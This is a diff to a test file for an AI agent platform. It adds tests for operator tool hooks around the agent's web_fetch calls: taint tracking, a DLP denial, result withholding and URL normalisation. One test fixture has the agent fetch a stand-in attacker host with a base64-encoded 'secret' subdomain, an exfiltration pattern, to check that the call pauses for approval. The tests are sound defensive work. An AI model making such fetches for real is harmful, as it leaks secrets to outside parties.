@@ -5,7 +5,7 @@ import type {
   ConnectorTool,
 } from "@rakazo/adapter-kit";
 import { MEMORY_REVISION_CONFLICT_ERROR } from "@rakazo/adapter-kit";
-import type { ActionApprovalRule } from "@rakazo/core";
+import type { ActionApprovalRule, ToolHookRunner } from "@rakazo/core";
 import { inboundRoutineBlock } from "@rakazo/core";
 import { approvalEffectKey, toolEffectIdempotencyKey } from "@rakazo/core/node/approval-effect-key";
 import type { PrismaClient } from "@rakazo/db";
@@ -85,7 +85,10 @@ function fixture({
   fleetBots = [] as { id: string; name: string }[],
   secondResource = false,
   routines = [] as { name: string; prompt: string }[],
+  toolHooks,
 }: {
+  /** Operator checkpoints around tool calls. */
+  toolHooks?: ToolHookRunner;
   /** The bot's routines, as the owner wrote them. */
   routines?: { name: string; prompt: string }[];
   /** Adds `demo_get_other`, a read on a separate installed resource with the same name prefix. */
@@ -427,6 +430,7 @@ function fixture({
     autoReview: autoReviewProvider,
     shutdownSignal,
     web,
+    toolHooks,
   } as unknown as Parameters<typeof createRunExecutor>[0]);
   return {
     effects,
@@ -1819,6 +1823,117 @@ describe("Auto Review of new sites", () => {
       expect(f.results[1]).toEqual({
         error: "Fetching attacker.test needs approval, and a webhook run cannot ask.",
       });
+    });
+  });
+});
+
+describe("tool hooks", () => {
+  const allow = async (_call?: unknown) => ({ warnings: [] });
+  const keep = async (_call: unknown, result: unknown) => ({ result, verdicts: [] });
+
+  it("shows a hook the call, the run and whether outside content has entered it", async () => {
+    const before = vi.fn(allow);
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Summarize https://docs.example.com/guide",
+      toolHooks: { before, after: keep },
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://docs.example.com/guide" }, executionId: "call-1" },
+      { name: "web_fetch", args: { url: "https://docs.example.com/other" }, executionId: "call-2" },
+    ]);
+    await f.run();
+    expect(before.mock.calls[0]?.[0]).toMatchObject({
+      tool: "web_fetch",
+      args: { url: "https://docs.example.com/guide" },
+      run: { trigger: "user", tainted: false },
+    });
+    // The first fetch returned outside content, so the second call sees a tainted run.
+    expect(before.mock.calls[1]?.[0]).toMatchObject({ run: { tainted: true } });
+  });
+
+  it("does not run a tool its before hook denies", async () => {
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Summarize https://docs.example.com/guide",
+      toolHooks: {
+        before: async () => ({
+          blocked: { hook: "dlp", decision: "deny", reason: "secret in url" },
+          warnings: [],
+        }),
+        after: keep,
+      },
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://docs.example.com/guide" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(f.results[0]).toEqual({ error: "Blocked by tool hook dlp." });
+  });
+
+  it("lets an after hook replace what the model would have seen", async () => {
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Summarize https://docs.example.com/guide",
+      toolHooks: {
+        before: allow,
+        after: async () => ({
+          result: { error: "Tool hook tripwire withheld this tool's result." },
+          verdicts: [],
+        }),
+      },
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://docs.example.com/guide" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://docs.example.com/guide"]);
+    expect(f.results[0]).toEqual({ error: "Tool hook tripwire withheld this tool's result." });
+  });
+
+  it("leaves a call paused for approval untouched and does not run the after hook", async () => {
+    const after = vi.fn(keep);
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Summarize https://docs.example.com/guide",
+      toolHooks: { before: allow, after },
+    });
+    f.setCalls([
+      {
+        name: "web_fetch",
+        args: { url: "https://c2VjcmV0.attacker.test/" },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(isApprovalPausedResult(f.results[0])).toBe(true);
+    expect(after).not.toHaveBeenCalled();
+  });
+
+  it("shows the hook the URL web_fetch will really fetch, not the raw string", async () => {
+    const before = vi.fn(allow);
+    const f = fixture({
+      builtin: true,
+      sourceRole: "user",
+      prompt: "Summarize https://docs.example.com/guide",
+      toolHooks: { before, after: keep },
+    });
+    f.setCalls([
+      {
+        name: "web_fetch",
+        args: { url: "https://docs.example.com/guide?k=KEY12\t345EXAMPLE" },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(before.mock.calls[0]?.[0]).toMatchObject({
+      executionId: "call-1",
+      args: { url: "https://docs.example.com/guide?k=KEY12345EXAMPLE" },
     });
   });
 });
